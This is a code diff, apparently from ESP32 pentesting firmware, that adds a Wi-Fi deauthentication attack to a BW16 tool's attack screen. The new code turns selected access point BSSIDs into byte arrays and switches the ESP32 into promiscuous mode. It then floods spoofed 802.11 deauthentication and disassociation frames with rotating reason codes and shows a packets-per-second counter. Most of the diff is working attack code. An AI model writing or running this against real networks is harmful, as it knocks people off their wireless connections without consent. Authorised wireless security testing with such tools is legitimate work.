@@ -4,6 +4,8 @@
 #include "core/mykeyboard.h"
 #include "core/sd_functions.h"
 #include "core/utils.h"
+#include <WiFi.h>
+#include <esp_wifi.h>
 
 #define BW16_RX_PIN 3
 #define BW16_TX_PIN 1
@@ -462,42 +464,148 @@ void BW16Tool::beaconSpam() { send_attack_command("BEACON SPAM"); }
 void BW16Tool::beaconList() { send_attack_command("BEACON"); }
 void BW16Tool::beaconDeauth() { send_attack_command("BEACON AND ATTACK"); }
 
+static String fitTextToWidth(const String &text, int maxWidth) {
+    if (tft.textWidth(text) <= maxWidth) return text;
+    String clipped = text;
+    while (clipped.length() > 1 && tft.textWidth(clipped + "..") > maxWidth) {
+        clipped.remove(clipped.length() - 1);
+    }
+    return clipped + "..";
+}
+
 void BW16Tool::send_attack_command(String type) {
     String targetAP = "Unknown";
     String targetSSID = "Unknown";
     int targetChannel = 0;
 
+    struct EspTarget {
+        uint8_t bssid[6];
+        uint8_t channel;
+    };
+    std::vector<EspTarget> espTargets;
+
     if (!selected_bssids.empty()) {
         for (auto &bssid : selected_bssids) {
             for (auto &net : all_networks) {
                 if (net.bssid == bssid) {
-                    targetAP = net.ssid;
-                    targetSSID = net.bssid;
-                    targetChannel = net.channel;
+                    if (targetAP == "Unknown") {
+                        targetAP = net.ssid;
+                        targetSSID = net.bssid;
+                        targetChannel = net.channel;
+                    }
+
+                    String cleanMac = net.bssid;
+                    cleanMac.replace(":", "");
+                    cleanMac.replace("-", "");
+                    cleanMac.trim();
+                    if (cleanMac.length() == 12) {
+                        EspTarget t;
+                        for (int i = 0; i < 6; i++) {
+                            char hexByte[3] = {cleanMac[i * 2], cleanMac[i * 2 + 1], '\0'};
+                            t.bssid[i] = static_cast<uint8_t>(strtoul(hexByte, nullptr, 16));
+                        }
+                        t.channel = static_cast<uint8_t>(net.channel);
+                        espTargets.push_back(t);
+                    }
                     break;
                 }
             }
-            if (targetAP != "Unknown") break;
         }
     }
 
     drawMainBorderWithTitle("BW16 Attack");
-    tft.setCursor(10, 65);
-    tft.printf("AP: %s", targetAP);
-    tft.setCursor(10, 80);
-    tft.printf("CH: %d", targetChannel);
-    tft.setCursor(10, 95);
-    tft.printf("SSID: %s", targetSSID.substring(0, 18).c_str());
-    tft.setCursor(10, 120);
-    tft.printf("Running: %s", type);
-    tft.setCursor(10, 135);
-    tft.setTextColor(TFT_RED);
-    tft.printf("[SEL] to Stop");
-    tft.setTextColor(bruceConfig.priColor);
+    tft.setTextSize(1);
+    tft.setTextWrap(false);
+
+    const int leftX = 10;
+    const int maxTextW = tftWidth - (leftX * 2);
+    const int stopY = tftHeight - 22;
+
+    bool espActive = false;
+    if (!espTargets.empty()) {
+        WiFi.disconnect(true);
+        WiFi.mode(WIFI_STA);
+        if (esp_wifi_set_promiscuous(true) == ESP_OK) { espActive = true; }
+        esp_wifi_set_ps(WIFI_PS_NONE);
+        setCpuFrequencyMhz(240);
+    }
+
+    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
+    tft.setCursor(leftX, 62);
+    tft.print(fitTextToWidth("AP: " + targetAP, maxTextW));
+
+    tft.setCursor(leftX, 76);
+    tft.print(fitTextToWidth("CH: " + String(targetChannel), maxTextW));
+
+    tft.setCursor(leftX, 90);
+    tft.print(fitTextToWidth("BSSID: " + targetSSID, maxTextW));
+
+    tft.setCursor(leftX, 104);
+    if (espActive) {
+        tft.setTextColor(TFT_GREEN, bruceConfig.bgColor);
+        tft.print(fitTextToWidth("ESP Atk: ON (" + String((int)espTargets.size()) + ")", maxTextW));
+    } else {
+        tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
+        tft.print(fitTextToWidth("ESP Atk: OFF", maxTextW));
+    }
+
+    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
+    tft.setCursor(leftX, 118);
+    tft.print(fitTextToWidth("Run: " + type, maxTextW));
+
+    tft.setTextColor(TFT_RED, bruceConfig.bgColor);
+    tft.setCursor(leftX, stopY);
+    tft.print(fitTextToWidth("[SEL] to Stop", maxTextW));
+    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
+
+    uint8_t packet[26] = {0xC0, 0x00, 0x3A, 0x01, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00,
+                          0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00};
+
+    uint32_t tmp = millis();
+    uint16_t count = 0;
+    uint8_t current_channel = 0;
 
     BW16Serial->println(type);
     while (true) {
+        if (espActive) {
+            for (const auto &rec : espTargets) {
+                if (current_channel != rec.channel) {
+                    esp_wifi_set_channel(rec.channel, WIFI_SECOND_CHAN_NONE);
+                    current_channel = rec.channel;
+                    vTaskDelay(2 / portTICK_PERIOD_MS);
+                }
+
+                memcpy(&packet[10], rec.bssid, 6);
+                memcpy(&packet[16], rec.bssid, 6);
+
+                for (int i = 0; i < 6; i++) {
+                    packet[0] = (i % 2 == 0) ? 0xC0 : 0xA0;
+
+                    if (i % 3 == 0) packet[24] = 0x07;
+                    else if (i % 3 == 1) packet[24] = 0x02;
+                    else packet[24] = 0x27;
+
+                    esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
+                    count++;
+                    delayMicroseconds(5);
+                }
+
+                if (check(SelPress)) break;
+            }
+
+            if (millis() - tmp >= 1000) {
+                tft.fillRect(leftX, 104, maxTextW, 12, bruceConfig.bgColor);
+                tft.setCursor(leftX, 104);
+                tft.setTextColor(TFT_GREEN, bruceConfig.bgColor);
+                tft.print(fitTextToWidth("ESP Atk: ON (" + String(count) + "/s)", maxTextW));
+                tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
+                count = 0;
+                tmp = millis();
+            }
+        }
+
         if (check(SelPress)) {
+            if (espActive) esp_wifi_set_promiscuous(false);
             BW16Serial->println("STOP");
             vTaskDelay(200 / portTICK_PERIOD_MS);
             break;
